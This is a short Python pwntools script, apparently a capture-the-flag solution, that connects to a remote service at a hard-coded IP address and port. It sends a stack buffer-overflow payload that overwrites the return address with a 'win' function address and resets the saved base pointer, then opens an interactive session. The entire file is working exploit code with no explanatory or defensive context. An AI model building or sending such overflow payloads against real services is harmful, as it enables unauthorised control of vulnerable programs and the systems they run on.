#!/usr/bin/env python

from pwn import *

NEW_RBP     = 0xffffdc90
WIN_ADDR    = 0x0804854d

def recv_response(p):
    r = p.recvrepeat(2.0)
    print "[+] Response: " + r
    return r

p = remote("35.237.220.217", 1337)

recv_response(p)

buf = "a" * 0xa
buf += "b" * 0x4
buf += p32(WIN_ADDR)
buf += "c" * 0x20
buf += "utsa"
buf += "d" * (0x42 - len(buf))
buf += p32(NEW_RBP)

p.sendline(buf)

recv_response(p)

p.interactive()
